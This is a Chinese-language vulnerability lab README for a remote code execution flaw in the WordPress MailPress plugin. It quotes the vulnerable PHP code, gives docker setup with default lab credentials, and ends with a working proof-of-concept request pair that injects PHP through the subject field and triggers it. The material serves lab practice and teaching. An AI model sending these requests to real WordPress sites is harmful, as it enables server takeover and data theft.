## WordPress Mailpress Plugin 远程代码执行漏洞

### 漏洞信息

 * [WordPress Mailpress Plugin 远程代码执行漏洞](http://0day5.com/archives/3960)

WordPress Mailpress Plugin  插件中, `mailpress\mp-includes\class\MP_Actions.class.php` 文件中 `iview` 函数中 `subject` 参数未经过滤，直接拼接do_eval函数执行代码，而do_eval函数也未经任何过滤，导致远程代码执行漏洞。

### 漏洞相关代码

```
public static function iview()
{
$mp_general = get_option(MailPress::option_name_general);

$id = $_GET[‘id’];
$main_id = (isset($_GET[‘main_id’])) ? $_GET[‘main_id’] : $id;

$mail = MP_Mail::get($id);

$theme = (isset($_GET[‘theme’]) && !empty($_GET[‘theme’])) ? $_GET[‘theme’] : (!empty($mail->theme) ? $mail->theme : false);
$mp_user_id = (isset($_GET[‘mp_user_id’]) && !empty($_GET[‘mp_user_id’])) ? $_GET[‘mp_user_id’] : false;

// from
$from = (!empty($mail->fromemail)) ? MP_Mail::display_toemail($mail->fromemail, $mail->fromname) : MP_Mail::display_toemail($mp_general[‘fromemail’], $mp_general[‘fromname’]);
// to
$to = MP_Mail::display_toemail($mail->toemail, $mail->toname, ”, $mp_user_id);
// subject
$x = new MP_Mail();
$subject = (in_array($mail->status, array(‘sent’, ‘archived’))) ? $mail->subject : $x->do_eval($mail->subject);
$subject = $x->viewsubject($subject, $id, $main_id, $mp_user_id);
// template
$template = (in_array($mail->status, array(‘sent’, ‘archived’))) ? false : apply_filters(‘MailPress_draft_template’, false, $main_id);

// content
$args = array();
$args[‘action’] = ‘viewadmin’;
foreach(array(‘id’, ‘main_id’, ‘theme’, ‘template’, ‘mp_user_id’) as $x) if ($$x) $args[$x] = $$x;

foreach(array(‘html’, ‘plaintext’) as $type)
{
$args[‘type’] = $type;
if (!empty($mail->{$type})) $$type = “<iframe id=’i{$type}’ style=’width:100%;border:0;height:550px’ src='” . esc_url(add_query_arg( $args, MP_Action_url )) . “‘></iframe>”;
}

// attachements
$attachements = ”;
$metas = MP_Mail_meta::has( $args[‘main_id’], ‘_MailPress_attached_file’);
if ($metas) foreach($metas as $meta) $attachements .= “<tr><td>&#160;” . MP_Mail::get_attachement_link($meta, $mail->status) . “</td></tr>”;
$view = true;
include(MP_ABSPATH . ‘mp-includes/html/mail.php’);
}
```

### 镜像信息

类型 | 用户名 | 密码
:-:|:-:|:-:
Mysql | root | root
/wp-admin/ | admin | admin123


### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:w_wordpress_2
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:w_wordpress_2
 ```
 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

### PoC 使用
1. 使用攻击代码触发漏洞
 ```
http://你的 IP 地址:端口号/wp-content/plugins/mailpress/mp-includes/action.php
 ```
post data:
 ```
action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();?>&html=&plaintext=&mail_format=standard&autosave=1
 ```


2. 访问存在漏洞页面获取结果

 ```
http://你的 IP 地址:端口号/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=返回的文章id号

 ```
